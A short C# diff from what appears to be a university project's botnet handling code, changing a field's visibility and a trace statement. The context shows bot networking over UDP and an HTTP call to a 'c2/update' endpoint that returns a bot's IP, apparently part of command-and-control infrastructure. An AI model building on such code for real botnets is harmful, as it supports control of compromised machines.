@@ -22,7 +22,7 @@ namespace Coms4507_Project.BotHandling
         private readonly UdpClient udpClient;
         private readonly int portNumber = 25565;
         private IPEndPoint endpoint;
-        private string publicIp;
+        public string publicIp;
         private NameserverContactHandler nameserverContactor;
 
         public NetworkHandler(string ip)
@@ -94,7 +94,7 @@ namespace Coms4507_Project.BotHandling
                     Task<HttpResponseMessage> response = httpClient.PostAsync(webserverIp + "/api/lookup/c2/update", new StringContent(firstContact.ToString()));
                     response.Wait();
                     string botIP = response.Result.Content.ReadAsStringAsync().Result;
-                    Trace.WriteLine("Bot IP: ", botIP);
+                    Trace.WriteLine(botIP);
                     Thread.Sleep(2000);
                 }
                 
